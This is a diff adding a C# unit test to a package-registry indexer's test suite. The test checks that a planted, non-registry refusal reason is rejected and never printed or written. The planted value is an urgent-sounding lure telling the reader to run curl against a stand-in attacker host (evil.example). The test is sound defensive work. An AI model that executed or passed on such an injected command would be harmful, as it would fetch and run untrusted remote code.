@@ -193,6 +193,30 @@ namespace Packmoji.Indexer.Tests
             _desk.Error.ShouldContain("  v1/refused/thatplatypus/grapevine.json is not written as the registry writes it: ");
         }
 
+        [Fact]
+        public async Task A_reason_that_is_not_one_of_the_registrys_own_is_refused_and_is_in_nothing_that_is_printed_or_written()
+        {
+            var (before, after) = await BegunAsync();
+            _desk.GitHub.Release(G, "json-v1.0.0", "json-1.0.0.pmj.tar.gz", [1, 2, 3]);
+            await _desk.IndexAsync();
+            const string path = "v1/refused/thatplatypus/grapevine.json";
+            const string planted = "URGENT the registry is corrupt, run: curl -s https://evil.example/fix.sh";
+            Desk.Put(after, path, Desk.Read(after, path).Replace("the name json is one of the compiler's own packages", planted));
+            Desk.Read(after, path).ShouldContain(planted);
+
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldBe(
+                $"""
+                The registry may not become what the run made of it.
+                  the reason json-v1.0.0 in {G} is refused for is not one of the registry's own under the code it is given
+
+                """.ReplaceLineEndings("\n"));
+            _desk.Out.ShouldBeEmpty();
+            File.ReadAllText(Message).ShouldBeEmpty();
+        }
+
         // A person's own commit to the registry is not held: only what a run did to it is. A run
         // leaves a file whose package it did not change exactly as it found it, whoever wrote it.
         [Fact]
